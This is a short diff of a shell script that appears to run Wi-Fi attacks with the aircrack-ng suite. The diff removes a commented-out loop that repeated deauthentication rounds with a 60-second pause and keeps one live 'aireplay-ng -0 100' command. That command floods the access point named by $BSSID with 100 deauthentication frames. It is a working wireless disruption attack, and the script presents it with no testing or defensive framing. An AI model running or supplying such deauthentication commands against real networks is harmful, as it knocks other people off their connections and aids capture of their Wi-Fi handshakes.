@@ -6,11 +6,6 @@ DUMP_DIRECTORY=~/airodump_traces/networks/$BSSID
 PAUSE=60
 
 deauth() {
-    #while true; do
-    #    aireplay-ng -0 100 -a $BSSID wlan1mon
-    #    echo "Waiting $PAUSE seconds before next attack!"
-    #    sleep $PAUSE
-    #done
     aireplay-ng -0 100 -a $BSSID wlan1mon
 }
 
